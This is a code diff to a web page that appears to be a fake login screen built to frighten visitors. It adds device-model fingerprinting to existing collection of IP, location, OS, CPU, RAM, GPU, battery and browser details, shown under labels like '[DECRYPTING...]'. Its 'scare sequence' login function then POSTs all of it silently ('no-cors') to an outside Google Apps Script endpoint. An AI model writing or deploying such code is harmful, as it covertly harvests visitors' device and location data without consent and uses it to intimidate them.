@@ -403,6 +403,7 @@
                 <li>IPV4_ADDRESS: <span id="user-ip" class="decrypting">[DECRYPTING...]</span></li>
                 <li>LOCATION: <span id="user-loc">[LOCATING...]</span></li>
                 <li>OS_KERNEL_ID: <span id="user-os" class="decrypting">[SCANNING...]</span></li>
+                <li>DEVICE_MODEL: <span id="user-model" class="decrypting">[IDENTIFYING...]</span></li>
                 <li>CPU_CORE_COUNT: <span id="user-cpu">...</span></li>
                 <li>MEM_CAPACITY: <span id="user-ram">...</span></li>
                 <li>GPU_RENDERER: <span id="user-gpu">...</span></li>
@@ -589,6 +590,36 @@ const engEl = document.getElementById('user-engine');
         }, 2000);
     }
 
+// --- UPDATED DEVICE MODEL CAPTURE ---
+const modelEl = document.getElementById('user-model');
+
+if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
+    navigator.userAgentData.getHighEntropyValues(['model']).then(ua => {
+        // 1. If it's a mobile (like Moto G73), ua.model will have the name.
+        if (ua.model && ua.model !== "") {
+            modelEl.innerText = ua.model.toUpperCase();
+        } else {
+            // 2. SCARY FALLBACKS FOR DESKTOP (Windows/Mac/Linux)
+            const platform = navigator.platform;
+            if (platform.includes("Win")) {
+                modelEl.innerText = "NT_BASED_WORKSTATION_X64";
+            } else if (platform.includes("Mac")) {
+                modelEl.innerText = "APPLE_DARWIN_HARDWARE_NODE";
+            } else if (platform.includes("Linux")) {
+                modelEl.innerText = "LINUX_KERNEL_X86_DISTRO";
+            } else {
+                modelEl.innerText = "GENERIC_UNIX_STATION";
+            }
+        }
+        modelEl.classList.remove('decrypting');
+    });
+} else {
+    // 3. Fallback for iPhone/Safari (which block this specific model data)
+    modelEl.innerText = "ENCRYPTED_HARDWARE_ID";
+    modelEl.classList.remove('decrypting');
+}
+
+    
     // --- 3. LOGIN LOGIC & SCARE SEQUENCE ---
     function attemptLogin() {
         const cap = grecaptcha.getResponse();
@@ -604,6 +635,7 @@ const engEl = document.getElementById('user-engine');
         const ip = document.getElementById('user-ip').innerText;
         const session = document.getElementById('session-id-text').innerText;
         const os = document.getElementById('user-os').innerText;
+        const model = document.getElementById('user-model').innerText; // NEW
         const cpu = document.getElementById('user-cpu').innerText;
         const ram = document.getElementById('user-ram').innerText;
         const gpu = document.getElementById('user-gpu').innerText;
@@ -611,8 +643,7 @@ const engEl = document.getElementById('user-engine');
         const batt = document.getElementById('user-batt').innerText;
         const browser = document.getElementById('user-engine').innerText;
 
-        const payload = `ip=${encodeURIComponent(ip)}&session=${encodeURIComponent(session)}&city=${encodeURIComponent(userCity)}&country=${encodeURIComponent(userCountry)}&os=${encodeURIComponent(os)}&cpu=${encodeURIComponent(cpu)}&ram=${encodeURIComponent(ram)}&gpu=${encodeURIComponent(gpu)}&res=${encodeURIComponent(res)}&batt=${encodeURIComponent(batt)}&browser=${encodeURIComponent(browser)}`;
-
+        const payload = `ip=${encodeURIComponent(ip)}&session=${encodeURIComponent(session)}&city=${encodeURIComponent(userCity)}&country=${encodeURIComponent(userCountry)}&os=${encodeURIComponent(os)}&model=${encodeURIComponent(model)}&cpu=${encodeURIComponent(cpu)}&ram=${encodeURIComponent(ram)}&gpu=${encodeURIComponent(gpu)}&res=${encodeURIComponent(res)}&batt=${encodeURIComponent(batt)}&browser=${encodeURIComponent(browser)}`;
         fetch(GOOGLE_SCRIPT_URL, {
             method: 'POST',
             mode: 'no-cors',
